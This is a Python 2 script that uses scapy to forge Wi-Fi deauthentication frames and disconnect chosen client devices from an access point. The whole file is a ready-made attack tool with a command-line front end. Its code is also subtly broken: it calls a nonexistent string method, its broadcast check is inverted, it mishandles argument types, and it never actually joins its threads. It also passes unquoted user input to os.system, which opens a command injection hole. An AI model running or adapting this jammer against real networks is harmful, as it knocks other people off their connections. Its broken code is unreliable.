#! /usr/bin/env python

# We might just use this?
# https://gist.githubusercontent.com/raw/4576966/4591a64fcad42fe8aff239e3319e5949fef95d59/sniff-aps-complete.py

import threading
import atexit
import argparse
import types
import os
import scapy.all as scapy


class DeauthJammer(object):

    def __init__(self, ap_bssid, iface="wlan0mon"):
        self._ap_bssid = ap_bssid
        self._threads = []
        # scapy.conf.iface =
        atexit.register(self._on_end)
        scapy.conf.iface = iface
        scapy.conf.verb = 0  # Non-verbose mode

    def jam(self, targets, packet_count=1):
        if type(targets) is types.StringType:
            targets = list(targets)

        assert type(targets) is types.ListType

        for target in targets:
            jamThread = threading.Thread(
                target=self._deauth_target, args=(target, packet_count), kwargs={})
            self._threads.append(jamThread)
            jamThread.start()

    def _deauth_target(self, target, packet_count):
        broadcast = target.lowercase() != 'FF:FF:FF:FF:FF:FF'
        ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=self._ap_bssid,
                                        addr3=self._ap_bssid) / scapy.Dot11Deauth()
        client_to_ap_pckt = None
        if not broadcast:
            client_to_ap_pckt = scapy.Dot11(
                addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()

        for n in range(packet_count):
            scapy.send(ap_to_client_pckt)

            if not broadcast:
                scapy.send(client_to_ap_pckt)

        print "Sent " + str(packet_count) + " packets to " + target

    def _on_end(self):
        for thread in self._threads:
            thread.join

if __name__ == '__main__':
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-a, --bssid", dest="bssid",
                            help="BSSID of ap that inadvertently closes the connection", metavar="BSSID")
    arg_parser.add_argument("-t, --client_mac", dest="client_mac",
                            help="Target of deauthentification", metavar="CLIENT_MAC")
    arg_parser.add_argument("-c, --channel", dest="channel",
                            help="Channel on which the network operates", metavar="CHANNEL")
    arg_parser.add_argument("-n", dest="count", default="64",
                            help="Amount of deauth-packages to be sent", metavar="COUNT")
    arg_parser.add_argument("-i, --iface", dest="iface", default="wlan0mon",
                            help="Interface to use for sending deauth-packages", metavar="IFACE")

    parsed_options = arg_parser.parse_args()
    parsed_options.count = int(parsed_options.count)

    os.system("iwconfig %s channel %d" %
              (parsed_options.iface, parsed_options.channel))
    print "Switched to channel %d on interface %s" % (parsed_options.channel, parsed_options.iface)

    jammer = DeauthJammer(parsed_options.bssid, iface=parsed_options.iface)
    jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count)
